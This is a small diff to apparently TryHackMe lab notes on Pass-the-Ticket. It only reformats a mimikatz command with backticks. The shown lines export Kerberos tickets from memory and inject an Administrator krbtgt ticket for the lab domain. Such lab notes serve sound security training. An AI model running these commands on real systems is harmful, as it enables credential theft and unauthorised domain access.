@@ -36,5 +36,6 @@ Pass-the-Ticket
     mimikatz # sekurlsa::tickets /export
 
 Once the desired ticket has been extracted.
-    mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi  
+
+    `mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi`  
 
